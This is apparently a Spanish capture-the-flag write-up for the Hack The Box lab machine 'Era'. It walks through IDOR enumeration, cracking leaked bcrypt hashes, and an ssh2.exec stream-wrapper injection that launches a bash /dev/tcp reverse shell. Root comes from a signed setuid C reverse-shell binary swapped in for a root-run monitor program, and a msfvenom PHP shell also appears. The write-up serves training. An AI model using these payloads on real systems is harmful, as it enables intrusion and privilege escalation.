***
- Tags:
***
Vamos a resolver la máquina Era. 
- Categoría: Medium
- Sistema: Linux
- IP: `10.10.11.79

### 1. Enumeración

El escaneo inicial de puertos nos revela la siguiente información:

```bash
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

Un análisis más exhaustivo nos dice lo siguiente:

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que se encuentran abiertos FTP y el puerto HTTP, que tiene un redirect a `http://era.htb`, por lo que lo añadimos a nuestro `/etc/hosts`. La versión de `vsftpd` no trae exploits conocidos, así que nos tendremos que centrar en la web. 

![[Era_1.png]]

En este punto, realizamos escaneo de subdominios y de directorios o archivos ocultos. Durante la enumeración de subdominios hemos empleado FFUF con inyección de header Host, descubriendo un vhost configurado en el servidor pese a no tener registro DNS. Esto nos confirma que el servicio web responde a nombre de host personalizados y que es necesario combinar técnicas DNS y HTTP para un reconocimiento completo.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H  "Host: FUZZ.era.htb" -u http://era.htb -t 200 -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 90ms]
:: Progress: [114442/114442] :: Job [1/1] :: 323 req/sec :: Duration: [0:00:56] :: Errors: 0 ::
```

Ahí tenemos un subdominio válido. Lo añadimos a nuestro `/etc/hosts`. 

![[Era_2.png]]

Pasamos ahora a enumerar directorios y posibles archivos ocultos:

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://file.era.htb/ -x php,txt,bak --exclude-length 6765
```

![[Era_3.png | 800]]

Nos vamos a la ruta de registro. 
Después de registrarnos, nos vamos a la página donde podemos subir archivos y subimos cualquier cosa, aunque yo probé una reverse shell en PHP. Sorprendetemente me dejó subirla, pero no hay forma de visualizarla.
### 2. Explotación

> La reverse shell la generé con `msfvenom` para ahorrarme trabajo

```bash
msfvenom -p php/reverse_php LHOST=10.10.14.24 LPORT=443 -f raw > shell.php
```

Vemos este enlace de descarga:

![[Era_4.png]]

Hemos enviado la petición de descarga a Intruder, marcado únicamente el parámetro `id` como posición de payload y definido un rango numérico de IDs para probar. Configuramos patrones de extracción basados en cabeceras y firmas de archivos, y lanzamos el ataque. Después ordenamos resultados por longitud y coincidencias de Grep para localizar aquellos `id` que devuelven contenido distinto o potencialmente interesante.

![[Era_5.png]]

Ponemos como Payload el campo `id`, establecemos un diccionario que contemple los números `0-9999` y esperamos. 

![[Pruebas prácticas/HTB/Máquinas/Linux/Medium/Era/IMGs/Era_6.png]]

Tras un rato, comprobamos dos endpoints interesantes porque su `length` es diferente a `7969`. En concreto, estas dos rutas:
- /download.php?id=54
- /download.php?id=150

![[Era_10.png]]

Pues usamos esas dos rutas para descargar contenido interno, y encontramos dos archivos muy interesantes:

```
signing.zip  site-backup-30-08-24.zip
```

Abrimos la base de datos `filedb.sqlite` encontrado en el segundo zip con sqlite3, listamos tablas y mostramos el esquema para entender su estructura. A continuación extraemos los registros de las tablas relevantes (`files`, `users`, etc.) y filtramos por campos que puedan contener credenciales o rutas críticas. Finalmente volcamos los datos a CSV para analizarlos y determinar los IDs de interés para futuras descargas.

```SQL
❯ sqlite3 filedb.sqlite
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE files (
		fileid int NOT NULL PRIMARY KEY,
		filepath varchar(255) NOT NULL,
		fileowner int NOT NULL,
		filedate timestamp NOT NULL
		);
INSERT INTO files VALUES(54,'files/site-backup-30-08-24.zip',1,1725044282);
CREATE TABLE users (
		user_id INTEGER PRIMARY KEY AUTOINCREMENT,
		user_name varchar(255) NOT NULL,
		user_password varchar(255) NOT NULL,
		auto_delete_files_after int NOT NULL
		, security_answer1 varchar(255), security_answer2 varchar(255), security_answer3 varchar(255));
INSERT INTO users VALUES(1,'admin_ef01cab31aa','$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC',600,'Maria','Oliver','Ottawa');
INSERT INTO users VALUES(2,'eric','$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(3,'veronica','$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(4,'yuri','$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(5,'john','$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6',-1,NULL,NULL,NULL);
INSERT INTO users VALUES(6,'ethan','$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC',-1,NULL,NULL,NULL);
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',16);
COMMIT;
sqlite> 
```

Exportamos la base de datos con `.dump` y confirmamos que la tabla `files` solo contiene el zip de backup en `fileid = 54`. En `users` vemos seis cuentas con contraseñas bcrypt y, en el caso de `admin_ef01cab31aa`, tres respuestas de seguridad en claro. A partir de aquí descargaremos el backup, extraeremos el contenido y abordaremos el cracking de hashes junto al análisis de las respuestas de seguridad. Intentamos con john romper las contraseñas, con el siguiente archivo txt:

```
admin_ef01cab31aa:$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
veronica:$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
john:$2a$10$iccCEz6.5.W2p7CSBOr3ReeOqyNmINMH1LaqeQaL22a1T1V/IddE6
ethan:$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
```

```
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
...SNIP...

john --show hashes.txt
eric:america
yuri:mustang
```

En este punto entramos mediante FTP con el usuario `yuri`. Descargamos todo de forma recursiva para leerlo offline:

```bash
wget --recursive --no-parent \
     --ftp-user=yuri --ftp-password=mustang \
     ftp://file.era.htb/ \
     -P ~/Escritorio/HTB/Machines/Linux/Medium/Era/content/ftp_download
```

Lamentablemente no hay nada interesante. Sin embargo, en `download.php` encontramos una vulnerabilidad. Veamos el código:

```php
<?php

require_once('functions.global.php');
require_once('layout.php');

function deliverMiddle_download($title, $subtitle, $content) {
    return '
    <main style="
        display: flex; 
        flex-direction: column; 
        align-items: center; 
        justify-content: center; 
        height: 80vh; 
        text-align: center;
        padding: 2rem;
    ">
        <h1>' . htmlspecialchars($title) . '</h1>
        <p>' . htmlspecialchars($subtitle) . '</p>
        <div>' . $content . '</div>
    </main>
    ';
}


if (!isset($_GET['id'])) {
	header('location: index.php'); // user loaded without requesting file by id
	die();
}

if (!is_numeric($_GET['id'])) {
	header('location: index.php'); // user requested non-numeric (invalid) file id
	die();
}

$reqFile = $_GET['id'];

$fetched = contactDB("SELECT * FROM files WHERE fileid='$reqFile';", 1);

$realFile = (count($fetched) != 0); // Set realFile to true if we found the file id, false if we didn't find it

if (!$realFile) {
	echo deliverTop("Era - Download");

	echo deliverMiddle("File Not Found", "The file you requested doesn't exist on this server", "");

	echo deliverBottom();
} else {
	$fileName = str_replace("files/", "", $fetched[0]);


	// Allow immediate file download
	if ($_GET['dl'] === "true") {

		header('Content-Type: application/octet-stream');
		header("Content-Transfer-Encoding: Binary");
		header("Content-disposition: attachment; filename=\"" .$fileName. "\"");
		readfile($fetched[0]);
	// BETA (Currently only available to the admin) - Showcase file instead of downloading it
	} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    		$format = isset($_GET['format']) ? $_GET['format'] : '';
    		$file = $fetched[0];

		if (strpos($format, '://') !== false) {
        		$wrapper = $format;
        		header('Content-Type: application/octet-stream');
    		} else {
        		$wrapper = '';
        		header('Content-Type: text/html');
    		}

    		try {
        		$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
			$full_path = $wrapper ? $wrapper . $file : $file;
			// Debug Output
			echo "Opening: " . $full_path . "\n";
        		echo $file_content;
    		} catch (Exception $e) {
        		echo "Error reading file: " . $e->getMessage();
    		}

	// Allow simple download
	} else {
		echo deliverTop("Era - Download");
		echo deliverMiddle_download("Your Download Is Ready!", $fileName, '<a href="download.php?id='.$_GET['id'].'&dl=true"><i class="fa fa-download fa-5x"></i></a>');

	}
}
?>
```

Hemos identificado una inyección de stream wrappers en la sección “show” de `download.php`. Inyectando un protocolo HTTP (`format=http://<mi_IP>:8000/`), forzamos al servidor a abrir un stream hacia nuestro listener, confirmando la posibilidad de un SSRF. A partir de aquí podemos pivotar para mapear servicios internos HTTP y exfiltrar datos sensibles. Para explotar esto, iniciamos sesión como `admin_ef01cab31aa` (usuario encontrado previamente) utilizando la funcionalidad `reset.php`, para modificar su contraseña.

![[Era_7.png | 800]]

Aceptamos y navegamos a `/security_login.php`, y nos pedirá esta información. Automáticamente nos redirigirá al login como dicho usuario admin. Ahora montamos la jugosa reverse shell:

```
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash%20-c%20"bash%20-i%20>%26%20%2Fdev%2Ftcp%2F10.10.14.24%2F4444%200%3E%261%22;
```

Hemos reestructurado la URL de la petición dividiéndola en base y parámetros, con sangrías que facilitan la lectura de cada valor, especialmente el wrapper `ssh2.exec` y el comando de reverse shell. Así evitamos errores al copiarla o pegarla en herramientas.

```bash
http://file.era.htb/download.php?
  id=54&
  show=true&
  format=ssh2.exec://yuri:mustang@127.0.0.1/bash -c \
"bash -i >& /dev/tcp/10.10.14.24/4444 0>&1";
```

Ya ganamos una shell como el usuario `yuri`. Este usuario no tiene la flag, pero había otro usuario existente, cuya contraseña obtuvimos previamente. `eric:america`. Estabilizamos la shell con estos pasos, los de siempre:

1. `stty raw -echo; fg``
2. `export xterm`
3. `export TERM=xterm`
4. `export SHELL=bash`

Y tendremos en su directorio la flag de usuario.

```bash
eric@era:/home/yuri$ whoami
eric
eric@era:/home/yuri$ cd ..
eric@era:/home$ ls
eric  yuri
eric@era:/home$ cd eric
eric@era:~$ ls
user.txt
eric@era:~$ cat user.txt
929fc2e032333421aacbb61582117743
eric@era:~$ 
```
### 3. Escalada de privilegios

Ahora, al pasarle `linPEAS.sh` obtenemos la siguiente información:

![[Era_8.png]]

Al parecer, existe un binario llamado `monitor`. Vamos a ver ahora la ejecución:

```bash
eric@era:~$ ps aux | grep root
...SNIP...
root        7540  0.0  0.0   2892   968 ?        Ss   05:05   0:00 /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1
root        7541  0.0  0.0   4784  3412 ?        S    05:05   0:00 /bin/bash /root/initiate_monitoring.sh
root        7551  0.0  0.0   2776   964 ?        S    05:05   0:00 /opt/AV/periodic-checks/monitor
```

Parece que este binario se ejecuta en segundo plano como `root`. 

```bash
eric@era:/opt/AV/periodic-checks$ ls
monitor  status.log
```

Escribimos un pequeño programa en C que eleva sus privilegios con `setuid(0)`/`setgid(0)` y lanza una reverse shell de Bash hacia nuestra IP. Lo compilamos con `-static` para que no dependa de librerías externas y verificamos que el binario resultante sea un ELF 64 bits autónomo. Finalmente firmaremos el ejecutable con la clave privada y el certificado extraídos de `signing.zip` para que el servidor lo acepte como legítimo.

```c
#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.24/1337 0>&1", NULL);
    return 0;
}
```

Compilamos nuestro código de exploit (`exploit.c`) con el compilador `x86_64-linux-gnu-gcc`, especificando `-o monitor` para nombrar el binario y `-static` para enlazar todas las librerías internamente. Así obtenemos un ejecutable ELF 64 bits independiente que funcionará sin dependencias adicionales en el servidor víctima.

```bash
x86_64-linux-gnu-gcc -o monitor exploit.c -static
```

Firmamos el binario con la herramienta `elf-sign` para cumplir el chequeo de integridad de la aplicación. Clonamos el repositorio de la herramienta de firmado, entramos en su carpeta y limpiamos los artefactos anteriores con `make clean`. Luego compilamos `elf_sign.c` usando `gcc -o elf-sign`, enlazando `libssl` y `libcrypto` y desactivando los warnings por declaraciones obsoletas.

```bash
git clone https://github.com/NUAA-WatchDog/linux-elf-binary-signer.git
cd linux-elf-binary-signer
make clean
gcc -o elf-sign elf_sign.c -lssl -lcrypto -Wno-deprecated-declarations
```

> Si da error el último paso, instalamos `libssl-dev` con `sudo apt install libssl-dev`

El siguiente paso es con las claves que obtuvimos al principio del zip `signing.zip`, firmar el binario. Necesitamos, entonces, `key.pem` y `x509.genKey`. Hemos firmado el binario `monitor` calculando un hash SHA‑256 de su sección de código y cifrándolo con nuestra clave privada (`key.pem`), generando la firma `.text_sig`. Este paso es imprescindible porque el servidor valida esa firma con su certificado antes de marcar el ejecutable como confiable y activar el bit SUID.

```bash
./elf-sign sha256 key.pem key.pem monitor
 --- 64-bit ELF file, version 1 (CURRENT), little endian.
 --- 26 sections detected.
 --- Section 0006 [.text] detected.
 --- Length of section [.text]: 480825
 --- Signature size of [.text]: 458
 --- Writing signature to file: .text_sig
 --- Removing temporary signature file: .text_sig
```

Renombramos el ejecutable compilado a `monitor.1` antes de firmarlo para conservar la versión original intacta. A continuación ejecutamos la herramienta de firmado sobre `monitor.1`, lo que genera de nuevo `monitor` con la firma incrustada. Así mantenemos un backup sin firma y obtenemos el binario final con el nombre requerido por el servidor.

```bash
mv monitor monitor.1
```

Por último, tenemos que subirlo. Simplemente montamos un servidor en nuestro Kali con Python para subir el archivo. Realizamos en remoto el siguiente proceso desde la ruta donde se encuentra el binario `monitor` original. 

```bash
eric@era:/opt/AV/periodic-checks$ wget http://10.10.14.24/monitor.1
eric@era:/opt/AV/periodic-checks$ rm monitor
eric@era:/opt/AV/periodic-checks$ mv monitor.1 monitor
eric@era:/opt/AV/periodic-checks$ chmod +x monitor
```

Luego, en otra terminal, nos ponemos en escucha:

```bash
nc -lvnp 1337
```

Y esperamos unos segundos. En unos instantes seremos root.

![[Era_9.png]]

Pillamos la flag y terminamos. 